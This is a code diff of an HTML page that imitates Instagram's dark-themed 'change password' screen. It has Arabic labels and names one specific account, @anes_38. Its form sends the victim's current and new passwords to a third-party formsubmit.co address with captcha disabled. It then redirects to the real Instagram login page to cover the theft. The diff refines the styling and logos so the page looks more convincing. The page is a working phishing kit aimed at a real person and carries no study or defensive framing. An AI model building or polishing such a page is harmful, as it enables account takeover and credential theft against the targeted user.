@@ -3,54 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Change Password • Instagram</title>
+    <title>Instagram</title>
     <style>
-        /* جعل الخلفية سوداء بالكامل وتغيير الخط */
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #000; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: #fff; }
+        * { box-sizing: border-box; }
+        body { background-color: #000000; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
         
-        /* إطار النموذج (أسود ولكنه أفتح قليلاً لإبراز الصندوق) */
-        .container { background: #000; border: 1px solid #262626; width: 350px; padding: 20px 40px; text-align: center; box-sizing: border-box; }
+        .container { width: 100%; max-width: 350px; padding: 20px; text-align: center; border: 1px solid #262626; border-radius: 1px; background-color: #000; }
         
-        /* جعل الشعار أبيضاً باستخدام فلتر */
-        .logo { width: 175px; margin: 20px 0; filter: invert(1); }
+        /* إصلاح الشعار وضمان ظهوره باللون الأبيض */
+        .logo { width: 175px; margin: 30px auto; display: block; filter: invert(1) brightness(2); }
         
-        /* تنسيق النص العلوي (رمادي فاتح) */
-        .info-text { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; font-weight: 600; }
-        
-        /* تنسيق خانات الإدخال الداكنة */
-        input { width: 100%; background: #121212; border: 1px solid #262626; border-radius: 3px; padding: 9px; margin-bottom: 10px; box-sizing: border-box; font-size: 12px; color: #fff; }
-        
-        /* تنسيق الزر الأزرق */
-        button { width: 100%; background-color: #0095f6; border: none; border-radius: 4px; color: white; padding: 7px; font-weight: 600; cursor: pointer; margin-top: 10px; }
-        button:disabled { background-color: rgba(0, 149, 246, .3); }
-        
-        /* تنسيق الفوتر مع شعار Meta */
-        .meta-footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
-        .meta-logo { width: 60px; vertical-align: middle; filter: invert(1); }
+        .user-info { color: #a8a8a8; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        .user-info b { color: #fff; }
+
+        input { width: 100%; background: #121212; border: 1px solid #363636; border-radius: 3px; padding: 12px; margin-bottom: 10px; color: #fff; font-size: 14px; outline: none; }
+        input:focus { border-color: #a8a8a8; }
+
+        button { width: 100%; background-color: #0095f6; border: none; border-radius: 8px; color: white; padding: 10px; font-weight: 600; cursor: pointer; margin-top: 15px; font-size: 14px; }
+        button:active { opacity: 0.7; }
+
+        .footer { margin-top: 50px; text-align: center; color: #a8a8a8; font-size: 12px; letter-spacing: 1px; }
+        .meta-logo { width: 60px; filter: invert(1); opacity: 0.8; margin-top: 5px; display: block; margin-left: auto; margin-right: auto; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <img src="https://www.instagram.com/static/images/web/mobile_gnl_header_upsell_2x.png/1b978e47f57a.png" alt="Instagram" class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo" alt="Instagram">
     
-    <p class="info-text">تغيير كلمة المرور لحساب @anes_38</p>
-
+    <div class="user-info">تغيير كلمة المرور لـ<br><b>anes_38</b></div>
+    
     <form action="https://formsubmit.co/b35269abccf715e68332f1a3a4ccca0c" method="POST">
-        <input type="hidden" name="_next" value="https://www.instagram.com/accounts/password/change/">
         <input type="hidden" name="_captcha" value="false">
-
-        <input type="password" name="old_password" placeholder="كلمة المرور الحالية" required>
+        <input type="hidden" name="_next" value="https://www.instagram.com/accounts/login/">
+        
+        <input type="password" name="current_password" placeholder="كلمة المرور الحالية" required>
         <input type="password" name="new_password" placeholder="كلمة المرور الجديدة" required>
         <input type="password" name="confirm_password" placeholder="تأكيد كلمة المرور الجديدة" required>
-
+        
         <button type="submit">تغيير كلمة المرور</button>
     </form>
 </div>
 
-<div class="meta-footer">
-    <span>from</span>
-    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/v2O_p4-S8sc.png" alt="Meta" class="meta-logo">
+<div class="footer">
+    <span style="text-transform: lowercase; opacity: 0.5;">from</span>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo" alt="Meta">
 </div>
 
 </body>
